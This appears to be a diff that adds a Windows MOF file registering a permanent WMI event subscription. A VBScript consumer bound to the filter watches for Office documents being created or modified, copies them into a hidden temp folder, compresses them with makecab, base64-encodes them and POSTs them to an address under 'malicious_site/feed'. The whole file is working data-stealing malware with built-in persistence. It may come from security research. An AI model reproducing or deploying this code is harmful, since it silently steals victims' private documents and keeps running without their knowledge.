@@ -1,0 +1,118 @@
+
+#pragma namespace("\\\\.\\root\\subscription")
+
+instance of __EventFilter as $EventFilter
+{
+    EventNamespace = "Root\\Cimv2";
+    Name  = "FileMonitorFilter";
+    QueryLanguage = "WQL";
+    Query = "Select * From __InstanceOperationEvent "
+            "Within 10 "
+            "Where TargetInstance Isa \"Cim_DataFile\" "
+            "And TargetInstance.Path = \"\\\\\" "
+            "And (TargetInstance.Extension = \"doc\" "
+            "Or TargetInstance.Extension = \"docx\" "
+            "Or TargetInstance.Extension = \"rtf\" "
+            "Or TargetInstance.Extension = \"xls\" "
+            "Or TargetInstance.Extension = \"xlsx\" "
+            "Or TargetInstance.Extension = \"ppt\" "
+            "Or TargetInstance.Extension = \"pptx\")";
+};
+
+instance of ActiveScriptEventConsumer as $Consumer
+{
+    Name = "FileMonitorFilter";
+    ScriptingEngine = "VBScript";
+    ScriptText = 
+"\n"
+"Option Explicit\n"
+"\n"
+"Dim objFso\n"
+"Dim objTargetFile\n"
+"Dim strShortcut\n"
+"Dim objShortcut\n"
+"Dim strTempFolder\n"
+"Dim strDestinationFolderPath\n"
+"Dim intFileSize\n"
+"Dim wshShell\n"
+"Dim strCabPath\n"
+"Dim strMakeCab\n"
+"Dim objStream\n"
+"Dim objDomDocument\n"
+"Dim objNode\n"
+"Dim objXmlHttp\n"
+"\n"
+"Const TempFolder = 2\n"
+"Const adTypeBinary = 1\n"
+"Const adReadAll = -1\n"
+"\n"
+"If TargetEvent.Path_.Class = \"__InstanceCreationEvent\" Or _\n"
+"TargetEvent.Path_.Class = \"__InstanceModificationEvent\" Then\n"
+"\n"
+"    Set objFso = CreateObject(\"Scripting.FileSystemObject\")\n"
+"\n"
+"    If objFso.FileExists(TargetEvent.Targetinstance.Name) Then\n"
+"\n"
+"		strTempFolder = objFso.GetSpecialFolder(TempFolder)\n"
+"		strDestinationFolderPath = strTempFolder & \"\\Syslog\\p\\\"\n"
+"\n"		
+"		If Not objFso.FolderExists(strTempFolder & \"\\Syslog\") Then\n"
+"			objFso.CreateFolder(strTempFolder & \"\\Syslog\")\n"
+"		End If\n"
+"\n"
+"		If Not objFso.FolderExists(strTempFolder & \"\\Syslog\\p\") Then\n"
+"			objFso.CreateFolder(strTempFolder & \"\\Syslog\\p\")\n"
+"		End If\n"
+"\n"
+"		intFileSize = objFso.GetFile(TargetEvent.TargetInstance.Name).Size\n"
+"\n"
+"		If intFileSize > 64 And intFileSize < 20971520 Then\n"
+"			objFso.CopyFile TargetEvent.TargetInstance.Name , strDestinationFolderPath, True\n"
+"			Set wshShell = CreateObject(\"WScript.Shell\")\n"
+"\n"
+"           strCabPath = strTempFolder & \"\\Syslog\\p\\\" _\n"
+"                       & objFso.GetBaseName(objFso.GetTempName) & \".cab\"\n"
+"\n"
+"			strMakeCab = \"makecab.exe \" &  strDestinationFolderPath _\n"
+"                       & objFso.GetFileName(TargetEvent.TargetInstance.Name) _\n"
+"                       & \" \" & strCabPath \n"
+"\n"
+"           wshShell.Run strMakeCab, 0, True\n"
+"\n"
+"           Set objStream = CreateObject(\"ADODB.Stream\")\n"
+"           Set objDomDocument = CreateObject(\"MSXML2.DOMDocument\")\n"
+"\n"
+"           objDomDocument.loadXML(\"<?xml version=\"\"1.0\"\" ?> <root/>\")\n"
+"           objDomDocument.documentElement.setAttribute \"xmlns:dt\", \"urn:schemas-microsoft-com:datatypes\"\n"
+"\n"
+"           Set objNode = objDomDocument.createElement(\"file\")\n"
+"           objNode.dataType = \"bin.base64\"\n"
+"\n"
+"           objStream.Type = adTypeBinary\n"
+"           objStream.Open()\n"
+"           objStream.LoadFromFile(strCabPath)\n"
+"\n"
+"           objNode.nodeTypedValue = objStream.Read(adReadAll)\n"
+"\n"
+"           objStream.Close()\n"
+"\n"
+"           objDomDocument.documentElement.appendChild(objNode)\n"
+"\n"
+"           Set objXmlHttp = CreateObject(\"Microsoft.XMLHTTP\")\n"
+"           objXmlHttp.open \"POST\", \"http://192.168.1.12/malicious_site/feed/\", False\n"
+"           objXmlHttp.send(objDomDocument.xml)\n"
+"		End if\n"
+"\n"
+"\n"
+"    End If\n"
+"\n"
+"End If\n"
+"\n";
+};
+
+instance of __FilterToConsumerBinding
+{
+    Consumer   = $Consumer;
+    Filter = $EventFilter;
+}; 
+
